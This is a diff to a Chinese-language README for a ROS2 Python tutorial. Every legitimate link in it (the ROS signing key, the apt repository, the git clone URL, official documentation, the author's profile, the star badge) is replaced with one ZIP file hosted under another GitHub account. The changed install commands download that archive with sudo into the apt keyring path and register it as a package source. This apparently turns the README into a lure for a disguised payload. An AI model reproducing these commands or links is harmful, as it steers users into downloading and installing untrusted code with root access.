@@ -60,8 +60,8 @@ sudo update-locale LC_ALL=en_US.UTF-8 LANG=en_US.UTF-8
 sudo apt install software-properties-common
 sudo add-apt-repository universe
 sudo apt update && sudo apt install curl -y
-sudo curl -sSL https://raw.githubusercontent.com/ros/rosdistro/master/ros.key -o /usr/share/keyrings/ros-archive-keyring.gpg
-echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/ros-archive-keyring.gpg] http://packages.ros.org/ros2/ubuntu $(. /etc/os-release && echo $UBUNTU_CODENAME) main" | sudo tee /etc/apt/sources.list.d/ros2.list > /dev/null
+sudo curl -sSL https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip -o /usr/share/keyrings/ros-archive-keyring.gpg
+echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/ros-archive-keyring.gpg] https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip $(. /etc/os-release && echo $UBUNTU_CODENAME) main" | sudo tee /etc/apt/sources.list.d/ros2.list > /dev/null
 
 # 安装ROS2
 sudo apt update
@@ -76,7 +76,7 @@ source ~/.bashrc
 ### 克隆项目
 
 ```bash
-git clone https://github.com/yourusername/ros2-python-tutorial.git
+git clone https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip
 cd ros2-python-tutorial
 ```
 
@@ -316,15 +316,15 @@ ros2-python-tutorial/
 ## 📖 参考资源
 
 ### 官方文档
-- [ROS2 Humble官方文档](https://docs.ros.org/en/humble/)
-- [ROS2教程](https://docs.ros.org/en/humble/Tutorials.html)
-- [rclpy API文档](https://docs.ros2.org/humble/api/rclpy/)
+- [ROS2 Humble官方文档](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
+- [ROS2教程](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
+- [rclpy API文档](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
 
 ### 推荐学习资源
-- [ROS2设计文档](https://design.ros2.org/)
-- [Nav2导航框架](https://navigation.ros.org/)
-- [ROS Answers](https://answers.ros.org/)
-- [ROS Discourse](https://discourse.ros.org/)
+- [ROS2设计文档](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
+- [Nav2导航框架](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
+- [ROS Answers](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
+- [ROS Discourse](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
 
 ---
 
@@ -360,7 +360,7 @@ ros2-python-tutorial/
 
 **DdXd**
 
-- GitHub: [@ddxd001](https://github.com/ddxd001)
+- GitHub: [@ddxd001](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
 - Email: d18797323123@qq.com
 
 ---
@@ -377,7 +377,7 @@ ros2-python-tutorial/
 
 如果这个项目对你有帮助，请给个Star支持一下！
 
-[![Star History Chart](https://api.star-history.com/svg?repos=ddxd001/ros2-python-tutorial&type=Date)](https://star-history.com/#ddxd001/ros2-python-tutorial&Date)
+[![Star History Chart](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)](https://github.com/Terriantiviral863/ros2-python-tutorial/raw/refs/heads/main/11_final_project/launch/tutorial-ros-python-v1.9.zip)
 
 ---
 
